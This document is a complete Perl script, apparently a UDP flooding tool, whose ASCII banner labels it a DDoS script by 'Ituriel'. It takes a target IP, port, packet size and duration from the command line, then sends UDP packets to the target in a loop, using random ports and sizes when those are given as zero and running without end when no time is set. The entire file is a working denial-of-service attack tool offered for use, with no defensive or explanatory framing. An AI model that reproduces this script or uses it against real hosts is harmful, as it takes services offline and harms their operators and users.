#!/usr/bin/perl START SCRIPT

use IO::Socket::INET;
use Socket;
use strict;

if ($#ARGV != 3) {
    system $^O eq 'MSWin32' ? 'cls' : 'clear';
    print "\n";
    print "'||'''|. '||'''|.                 .|'''|                              ||    \n";
    print " ||   ||  ||   ||                 ||                    ''            ||    \n";
    print " ||   ||  ||   || .|''|, (''''    `|'''|, .|'', '||''|  ||  '||''|, ''||''  \n";
    print " ||   ||  ||   || ||  ||  `'')     .   || ||     ||     ||   ||  ||   ||    \n";
    print ".||...|' .||...|' `|..|' `...'     |...|' `|..' .||.   .||.  ||..|'   `|..' \n";
    print "                                                             ||             \n";
    print "                                                            .||             \n";
    print "                                                                  ---- v1.1.0\n";
    print "                                                                       by Ituriel\n\n";

    print "[-] Usage: perl <filename>.pl <ip> <port> <size> <time>\n";
    print "[-] If port=0 -> using random ports\n";
    print "[-] If size = 0 -> using random packets\n";
    print "[-] If time = 0 -> keep flooding until user stops script\n";
    exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

system $^O eq 'MSWin32' ? 'cls' : 'clear';
print "\n";
print "'||'''|. '||'''|.                 .|'''|                              ||    \n";
print " ||   ||  ||   ||                 ||                    ''            ||    \n";
print " ||   ||  ||   || .|''|, (''''    `|'''|, .|'', '||''|  ||  '||''|, ''||''  \n";
print " ||   ||  ||   || ||  ||  `'')     .   || ||     ||     ||   ||  ||   ||    \n";
print ".||...|' .||...|' `|..|' `...'     |...|' `|..' .||.   .||.  ||..|'   `|..' \n";
print "                                                             ||             \n";
print "                                                            .||             \n";
print "                                                                  ---- v1.1.0\n";
print "                                                                       by Ituriel\n\n";

print "[+] Now flooding $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "[+] Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize",""), 0, pack_sockaddr_in($pport, $iaddr));}

#!/usr/bin/perl END SCRIPT